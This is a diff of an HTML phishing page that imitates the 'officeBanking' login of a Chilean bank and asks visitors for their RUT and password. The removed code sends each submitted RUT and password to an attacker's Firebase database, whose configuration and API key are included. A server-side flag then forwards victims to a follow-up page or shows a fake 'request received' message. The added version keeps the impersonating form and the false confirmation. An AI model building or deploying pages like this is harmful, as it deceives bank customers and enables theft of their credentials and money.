@@ -1,170 +1,124 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Ingreso a officeBanking</title>
+  <meta charset="UTF-8" />
+  <title>Ingreso OfficeBanking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
-      font-family: sans-serif;
-      background-color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
       margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      border: 2px solid red;
+      padding: 20px;
+      width: 90%;
+      max-width: 400px;
+      background: white;
+      box-sizing: border-box;
     }
     h2 {
-      color: black;
-    }
-    .banking {
-      background-color: red;
-      color: white;
-      padding: 2px 8px;
-      border-radius: 4px;
-      margin-left: 5px;
-    }
-    form {
-      border: 2px solid red;
-      padding: 20px;
-      border-radius: 10px;
-      background-color: white;
-      display: flex;
-      flex-direction: column;
-      width: 90%;
-      max-width: 300px;
-    }
-    input {
-      margin: 10px 0;
-      padding: 10px;
-      font-size: 18px;
-      border: 1px solid black;
-      border-radius: 5px;
-      width: calc(100% - 22px);
-    }
-    .input-container {
-      position: relative;
-    }
-    .toggle-password {
-      position: absolute;
-      right: 10px;
-      top: 14px;
-      cursor: pointer;
-    }
-    button {
-      margin-top: 10px;
-      padding: 10px;
-      font-size: 18px;
-      background-color: red;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-    .mensaje-final {
-      border: 2px solid red;
-      padding: 20px;
-      border-radius: 10px;
-      color: red;
-      font-size: 20px;
-      background: white;
+      margin: 0 0 20px;
       text-align: center;
     }
+    .title span:first-child {
+      color: black;
+    }
+    .title span:last-child {
+      background: red;
+      color: white;
+      padding: 2px 5px;
+      border-radius: 3px;
+    }
+    label {
+      display: block;
+      margin-bottom: 10px;
+      color: black;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid black;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+      font-size: 16px;
+    }
+    .password-container {
+      position: relative;
+    }
+    .password-container input {
+      padding-right: 40px;
+    }
+    .toggle {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      cursor: pointer;
+    }
+    .success-box {
+      border: 2px solid red;
+      padding: 20px;
+      color: red;
+      text-align: center;
+      font-weight: bold;
+      display: none;
+    }
+    @media (max-width: 600px) {
+      .container {
+        width: 100%;
+        height: 100vh;
+        justify-content: center;
+      }
+    }
   </style>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
-      authDomain: "formulario-officebanking.firebaseapp.com",
-      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
-      projectId: "formulario-officebanking",
-      storageBucket: "formulario-officebanking.appspot.com",
-      messagingSenderId: "604053438195",
-      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
-    };
-    firebase.initializeApp(firebaseConfig);
-
-    function formatoRUT(rut) {
-      rut = rut.replace(/[.-]/g, '').replace(/^0+/, '');
-      if (rut.length > 1) {
-        let cuerpo = rut.slice(0, -1);
-        let dv = rut.slice(-1);
-        cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-        return cuerpo + "-" + dv;
-      }
-      return rut;
-    }
-
-    function validarRUT(rutCompleto) {
-      rutCompleto = rutCompleto.replace(/\./g, "").replace("-", "");
-      const rut = rutCompleto.slice(0, -1);
-      const dv = rutCompleto.slice(-1).toUpperCase();
-      let suma = 0;
-      let multiplo = 2;
-
-      for (let i = rut.length - 1; i >= 0; i--) {
-        suma += parseInt(rut[i]) * multiplo;
-        multiplo = multiplo < 7 ? multiplo + 1 : 2;
-      }
-
-      const dvEsperado = 11 - (suma % 11);
-      const dvFinal = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
-      return dv === dvFinal;
-    }
-
-    function togglePassword() {
-      const input = document.getElementById("clave");
-      input.type = input.type === "password" ? "text" : "password";
-    }
-
-    function enviarFormulario(e) {
-      e.preventDefault();
-      const rut = document.getElementById("rut").value;
-      const clave = document.getElementById("clave").value;
-
-      if (!validarRUT(rut)) {
-        alert("RUT inválido");
-        return;
-      }
-
-      firebase.database().ref("usuarios").push({
-        rut: rut,
-        clave: clave,
-        timestamp: new Date().toLocaleString("es-CL")
-      }).then(() => {
-        firebase.database().ref("modo_asistente").once("value").then((snap) => {
-          const estado = snap.val();
-          if (estado === "activo") {
-            window.location.href = "cargando1.html";
-          } else {
-            document.getElementById("formulario").style.display = "none";
-            document.getElementById("mensajeFinal").style.display = "block";
-          }
-        });
-      });
-    }
-
-    window.onload = () => {
-      document.getElementById("rut").addEventListener("input", function () {
-        this.value = formatoRUT(this.value.replace(/[^0-9kK]/g, "").toUpperCase());
-      });
-    };
-  </script>
 </head>
 <body>
-  <h2>Ingreso a <span class="banking">officeBanking</span></h2>
+  <div class="container" id="formulario">
+    <h2 class="title"><span>Ingreso a </span><span>officeBanking</span></h2>
+    <form onsubmit="enviarDatos(event)">
+      <label for="rut">RUT</label>
+      <input type="text" id="rut" name="rut" required oninput="formatearRUT(this)" />
 
-  <form id="formulario" onsubmit="enviarFormulario(event)">
-    <input type="text" id="rut" placeholder="RUT" required maxlength="12" />
-    <div class="input-container">
-      <input type="password" id="clave" placeholder="Contraseña" required maxlength="12" />
-      <span class="toggle-password" onclick="togglePassword()">👁️</span>
-    </div>
-    <button type="submit">Ingresar</button>
-  </form>
+      <label for="clave">Contraseña</label>
+      <div class="password-container">
+        <input type="password" id="clave" name="clave" required />
+        <span class="toggle" onclick="toggleClave()">👁️</span>
+      </div>
 
-  <div id="mensajeFinal" class="mensaje-final" style="display:none;">
-    Hemos recibido tu solicitud correctamente.
+      <button type="submit">Ingresar</button>
+    </form>
   </div>
+
+  <div class="container success-box" id="confirmacion">
+    Hemos recibido tu solicitud correctamente
+  </div>
+
+  <script>
+    function toggleClave() {
+      const clave = document.getElementById("clave");
+      clave.type = clave.type === "password" ? "text" : "password";
+    }
+
+    function formatearRUT(input) {
+      let rut = input.value.replace(/[^\dkK]/g, '').toUpperCase();
+      if (rut.length > 1) {
+        rut = rut.slice(0, -1).replace(/\B(?=(\d{3})+(?!\d))/g, ".") + "-" + rut.slice(-1);
+      }
+      input.value = rut;
+    }
+
+    function enviarDatos(e) {
+      e.preventDefault();
+      document.getElementById("formulario").style.display = "none";
+      document.getElementById("confirmacion").style.display = "block";
+    }
+  </script>
 </body>
 </html>
